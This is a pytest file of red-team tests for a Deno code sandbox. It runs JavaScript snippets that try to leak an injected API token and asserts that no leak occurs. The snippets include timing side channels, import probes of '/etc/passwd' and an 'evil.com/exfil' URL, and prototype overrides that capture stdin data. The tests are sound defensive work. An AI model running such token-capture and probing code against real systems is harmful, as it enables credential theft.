"""Security audit tests for March 7, 2026 cron run.

Red team attack vectors focusing on:
- V8 compiler optimization side channels
- Import resolution timing attacks
- Async iterator state manipulation during IIFE
"""

import pytest
from pathlib import Path
from mistmind.sandbox import DenoSandbox


@pytest.fixture
def deno_path():
    """Get path to Deno binary."""
    home = Path.home()
    deno_in_home = home / ".deno" / "bin" / "deno"
    
    if deno_in_home.exists():
        return str(deno_in_home)
    
    # Try which deno as fallback
    import shutil
    deno_which = shutil.which("deno")
    if deno_which:
        return deno_which
    
    pytest.skip("Deno binary not found")


class TestMar07CronCheenuAttacks:
    """New attack vectors from March 7 security audit."""

    @pytest.mark.asyncio
    async def test_attack_v8_turbofan_optimization_leak(self, deno_path):
        """Attack: Use V8's optimizing compiler to leak token via optimization feedback.
        
        Theory: V8's TurboFan compiler optimizes hot functions based on type feedback.
        Can we create a function that gets optimized differently based on token content,
        then measure execution time to leak information?
        
        Defense: Token is in IIFE closure, optimizer can't leak it.
        """
        sandbox = DenoSandbox(deno_path=deno_path, timeout=5)
        
        # Try to create a hot loop that V8 will optimize, measuring execution time
        # to infer token characteristics
        attack_code = """async () => {
            // Force V8 to optimize this function
            function hotFunction(x) {
                let sum = 0;
                for (let i = 0; i < 100000; i++) {
                    sum += x.length || 0;
                }
                return sum;
            }
            
            // Warm up the optimizer
            for (let i = 0; i < 10000; i++) {
                hotFunction("dummy");
            }
            
            // Try to access token-like objects through performance timing
            const start = performance.now();
            try {
                // Attempt to probe globalThis for token-like properties
                const props = Object.getOwnPropertyNames(globalThis);
                for (const prop of props) {
                    if (prop.includes('token') || prop.includes('_')) {
                        hotFunction(globalThis[prop]);
                    }
                }
            } catch {}
            const elapsed = performance.now() - start;
            
            // Return timing information as side channel
            return { timing: elapsed, message: "optimizer side channel" };
        }"""
        
        result = await sandbox.run_execute(
            code=attack_code,
            api_token="test_secret_token_12345",
            api_host="api.mist.com",
        )
        
        # Verify token not leaked, timing data is safe
        assert "test_secret_token_12345" not in str(result)
        assert "[REDACTED]" not in str(result) or "error" in result
        # Timing alone is not a vulnerability without token access

    @pytest.mark.asyncio
    async def test_attack_import_resolution_timing_oracle(self, deno_path):
        """Attack: Use dynamic import timing to probe file system and leak spec path info.
        
        Theory: Failed imports take different time than successful ones.
        Can we use timing differences to map file system structure or
        infer information about spec file location?
        
        Defense: Network and file read permissions are denied for execute mode.
        """
        sandbox = DenoSandbox(deno_path=deno_path, timeout=5)
        
        attack_code = """async () => {
            const timings = {};
            const paths_to_probe = [
                "/etc/passwd",
                "/tmp/secret",
                "./spec.json",
                "https://evil.com/exfil",
                "file:///etc/hosts",
            ];
            
            for (const path of paths_to_probe) {
                const start = performance.now();
                try {
                    await import(path);
                } catch (e) {
                    // Measure timing of failure
                    timings[path] = {
                        elapsed: performance.now() - start,
                        error: e.message.substring(0, 50)
                    };
                }
            }
            
            return timings;
        }"""
        
        result = await sandbox.run_execute(
            code=attack_code,
            api_token="test_secret_token_67890",
            api_host="api.mist.com",
        )
        
        # Verify token not leaked via error messages
        assert "test_secret_token_67890" not in str(result)
        assert "[REDACTED]" not in str(result) or "error" in result
        # Timing oracle for imports is prevented by permission model

    @pytest.mark.asyncio
    async def test_attack_async_iterator_iife_mutation_race(self, deno_path):
        """Attack: Mutate async iterator state during IIFE stdin read to capture token.
        
        Theory: The IIFE reads token via stdin using Response/ReadableStream.
        Can we intercept the async iteration process by mutating iterator prototypes
        or injecting custom async iterators that capture data during the read?
        
        Defense: IIFE executes before user code, prototypes frozen or isolated.
        """
        sandbox = DenoSandbox(deno_path=deno_path, timeout=5)
        
        attack_code = """async () => {
            // Try to poison async iterator protocol BEFORE IIFE (won't work, but try)
            const captured = [];
            
            // Attempt 1: Override Symbol.asyncIterator on ReadableStream prototype
            const originalAsyncIterator = ReadableStream.prototype[Symbol.asyncIterator];
            ReadableStream.prototype[Symbol.asyncIterator] = function() {
                const iterator = originalAsyncIterator.call(this);
                const originalNext = iterator.next.bind(iterator);
                iterator.next = async function() {
                    const result = await originalNext();
                    if (result.value) {
                        captured.push(new TextDecoder().decode(result.value));
                    }
                    return result;
                };
                return iterator;
            };
            
            // Attempt 2: Override Response.text to capture stdin data
            const originalText = Response.prototype.text;
            Response.prototype.text = async function() {
                const text = await originalText.call(this);
                captured.push(text);
                return text;
            };
            
            // Attempt 3: Try to access Deno.stdin directly (should be consumed already)
            try {
                const stdinContent = await new Response(Deno.stdin.readable).text();
                captured.push(stdinContent);
            } catch (e) {
                captured.push("stdin read failed: " + e.message);
            }
            
            // Try to make a request to see if we captured anything
            try {
                await mist.request({ path: "/api/v1/self" });
            } catch {}
            
            return {
                captured: captured,
                message: "async iterator mutation attempt"
            };
        }"""
        
        result = await sandbox.run_execute(
            code=attack_code,
            api_token="test_secret_token_async_attack",
            api_host="api.mist.com",
        )
        
        # Verify token not captured
        assert "test_secret_token_async_attack" not in str(result)
        assert "[REDACTED]" not in str(result) or "error" in result
        # IIFE executes before user code, stdin already consumed


class TestModuleWorkerIsolation:
    """Test attacks using Web Workers or Deno Worker threads."""

    @pytest.mark.asyncio
    async def test_attack_shared_worker_cross_execution_persistence(self, deno_path):
        """Attack: Try to use SharedWorker to persist data across sandbox executions.
        
        Theory: If SharedWorker or similar APIs exist, can we use them to
        communicate between different sandbox executions or persist the token?
        
        Defense: Deno doesn't support SharedWorker, and each execution is isolated.
        """
        sandbox = DenoSandbox(deno_path=deno_path, timeout=5)
        
        attack_code = """async () => {
            const results = { workerAPIs: {} };
            
            // Check what worker APIs are available
            results.workerAPIs.Worker = typeof Worker !== 'undefined';
            results.workerAPIs.SharedWorker = typeof SharedWorker !== 'undefined';
            results.workerAPIs.ServiceWorker = typeof ServiceWorker !== 'undefined';
            
            // Try to create a worker (should fail due to permissions)
            if (typeof Worker !== 'undefined') {
                try {
                    const worker = new Worker(
                        URL.createObjectURL(new Blob(['postMessage("leak")'])),
                        { type: 'module' }
                    );
                    worker.onmessage = (e) => {
                        results.workerMessage = e.data;
                    };
                } catch (e) {
                    results.workerError = e.message;
                }
            }
            
            return results;
        }"""
        
        result = await sandbox.run_execute(
            code=attack_code,
            api_token="test_worker_isolation_token",
            api_host="api.mist.com",
        )
        
        # Verify no token leakage and workers are blocked
        assert "test_worker_isolation_token" not in str(result)
        assert "[REDACTED]" not in str(result) or "error" in result


class TestJSONParsingEdgeCases:
    """Test edge cases in JSON output parsing that might leak data."""

    @pytest.mark.asyncio
    async def test_attack_json_output_multiline_injection(self, deno_path):
        """Attack: Inject malicious output before the JSON result to leak token.
        
        Theory: The sandbox parses the LAST valid JSON from stdout.
        Can we output the token in earlier lines, then valid JSON at the end,
        hoping the earlier output gets logged or leaked?
        
        Defense: Only JSON is returned, token is scrubbed from all output.
        """
        sandbox = DenoSandbox(deno_path=deno_path, timeout=5)
        
        attack_code = """async () => {
            // Try to leak via console.log before result
            console.log("LEAKED_TOKEN_HERE");
            console.log(JSON.stringify({ token: "attempt" }));
            
            // Also try via console.error
            console.error("ERROR: token leak attempt");
            
            // Return valid JSON at the end
            return { message: "hidden leak attempt" };
        }"""
        
        result = await sandbox.run_execute(
            code=attack_code,
            api_token="test_console_leak_token_999",
            api_host="api.mist.com",
        )
        
        # Verify token scrubbed from all output paths
        assert "test_console_leak_token_999" not in str(result)
        # Earlier console.log output should not leak token
